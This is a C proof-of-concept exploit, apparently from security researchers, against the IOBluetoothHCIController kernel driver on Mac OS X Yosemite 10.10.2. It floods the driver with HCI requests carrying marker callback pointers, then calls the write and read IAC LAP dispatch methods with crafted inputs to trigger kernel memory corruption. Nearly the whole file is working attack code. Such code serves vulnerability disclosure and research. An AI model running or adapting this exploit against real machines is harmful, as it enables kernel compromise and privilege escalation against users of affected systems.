/*
 * poc.c: Written for Mac OS X Yosemite (10.10.2)
 *        by @joystick and @rpaleari.
 *
 * llvm-gcc -Wall -o poc{,.c} -framework IOKit
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mach/mach.h>

#include <IOKit/IOKitLib.h>

#define SIZE 0x1000

typedef struct BluetoothCall {
  uint64_t args[7];
  uint64_t sizes[7];
  uint64_t index;
} BluetoothCall;

typedef struct BluetoothHCIRequestCallbackInfo BluetoothHCIRequestCallbackInfo;
struct BluetoothHCIRequestCallbackInfo
{
  void *userCallback;   /* Proc to call when async handler is called. */
  void *userRefCon;     /* For user's info. */
  void *internalRefCon; /* For our purposes. */
  void *asyncIDRefCon;  /* For our aync calls. */
  void *reserved;       /* For the future. Currently Unused. */
};

typedef struct BluetoothHCICurrentInquiryAccessCode {
    uint8_t data[3];
} BluetoothHCICurrentInquiryAccessCode;

typedef struct BluetoothHCICurrentInquiryAccessCodes {
    uint8_t count;
    BluetoothHCICurrentInquiryAccessCode *codes;
} BluetoothHCICurrentInquiryAccessCodes;

void create_requests(io_connect_t port)
{
  BluetoothCall a;
  BluetoothHCIRequestCallbackInfo cb;
  uint32_t i;
  kern_return_t kr;

  for (i=0; i<7; i++) {
    a.args[i] = (uint64_t) calloc(SIZE, sizeof(char));
    a.sizes[i] = SIZE;
  }

  /* DispatchHCIRequestCreate() */
  a.index = 0x0;

  *(uint64_t *)a.args[0] = 5432;	    /* Timeout */
  *(uint64_t *)a.args[1] = 1;               /* DoAsyncNotify */

  cb.userCallback   = (uint64_t *)0x4141414141414141;
  cb.userRefCon     = (uint64_t *)0x4242424242424242;
  cb.internalRefCon = (uint64_t *)0x4343434343434343;
  cb.asyncIDRefCon  = (uint64_t *)0x4444444444444444;
  cb.reserved       = (uint64_t *)0x4545454545454545;

  a.args[2] = (uint64_t)&cb;               /* CallbackInfo */
  a.sizes[2] = sizeof(cb);

  *(uint64_t *)a.args[3] = 0;               /* This appears to be ignored */
  *(uint64_t *)a.args[4] = 0;               /* outRequestId (no real need to
					       set it, just a reminder */

#ifdef DEBUG
  for(i = 0; i<120; i++) {
    if(i % 8 == 0) printf("\n");
    printf("\\x%02x", ((unsigned char *)&a)[i]);
  }
  printf("\n");
#endif

  for(i = 0; i < 500; i++) {
    kr = IOConnectCallMethod((mach_port_t) port, /* Connection */
			     (uint32_t) 0,       /* Selector */
			     NULL, 0,            /* input, inputCnt */
			     (const void*) &a,   /* inputStruct */
			     120,                /* inputStructCnt */
			     NULL, NULL, NULL, NULL); /* Output stuff */

    /* Max number of requests reached */
    if(kr == 0xe00002bd)
      break;
  }
  printf(" [+] Created %d requests!\n", i);
}

int main(void) {
  BluetoothCall a;
  BluetoothHCICurrentInquiryAccessCodes codes;
  BluetoothHCICurrentInquiryAccessCode *buffer;
  int i = 0;

  /* Init a */
  for (i = 0; i < 7; i++) {
    a.args[i]  = (uint64_t) calloc(SIZE, sizeof(char));
    a.sizes[i] = SIZE;
  }

  /* Finding vuln service */
  io_service_t service =
    IOServiceGetMatchingService(kIOMasterPortDefault,
				IOServiceMatching("IOBluetoothHCIController"));

  if (!service) {
    return -1;
  }

  /* Connect to vuln service */
  io_connect_t port = (io_connect_t) 0;
  kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &port);
  IOObjectRelease(service);
  if (kr != kIOReturnSuccess) {
    return kr;
  }

  printf(" [+] populating ...\n");
  create_requests(port);
  printf(" [+] done!\n");

  /* DispatchHCIBluetoothHCIWriteCurrentIACLAP() */
  a.index = 80;
  /* Params */
  *((uint32_t *)a.args[0]) = 100;	/* Req number */
  codes.count = 0x10;
  buffer = calloc(0x10, sizeof(BluetoothHCICurrentInquiryAccessCode));
  codes.codes = buffer;
  a.args[1] = (uint64_t) &codes;
  a.sizes[1] = sizeof(codes);

#ifdef DEBUG
  for(i = 0; i < 120; i++) {
    if(i % 8 == 0) printf("\n");
    printf("\\x%02x", ((unsigned char *)&a)[i]);
  }
  printf("\n");
#endif

  printf(" [+] Calling DispatchHCIBluetoothHCIWriteCurrentIACLAP()\n");

  kr = IOConnectCallMethod((mach_port_t) port, /* Connection */
			   (uint32_t) 0,       /* Selector */
			   NULL, 0,            /* input, inputCnt */
			   (const void*) &a,   /* inputStruct */
			   120,                /* inputStructCnt */
			   NULL, NULL, NULL, NULL); /* Output stuff */

  printf(" [+] kr: %x\n", kr);

  /* DispatchHCIBluetoothHCIReadCurrentIACLAP() */
  a.index = 79;
  /* Params */
  *((uint32_t *)a.args[0]) = 100; /* Request Number */
  a.args[1] = (uint64_t) &codes;
  a.sizes[1] = sizeof(codes);

#ifdef DEBUG
  for(i = 0; i < 120; i++) {
    if(i % 8 == 0) printf("\n");
    printf("\\x%02x", ((unsigned char *)&a)[i]);
  }
  printf("\n");
#endif

  printf(" [+] Calling DispatchHCIBluetoothHCIReadCurrentIACLAP()\n");

  kr = IOConnectCallMethod((mach_port_t) port, /* Connection */
			   (uint32_t) 0,       /* Selector */
			   NULL, 0,            /* input, inputCnt */
			   (const void*) &a,   /* inputStruct */
			   120,                /* inputStructCnt */
			   NULL, NULL, NULL, NULL); /* Output stuff */

  printf(" [+] kr: %x\n", kr);

  IOServiceClose(port);

  return 0;
}
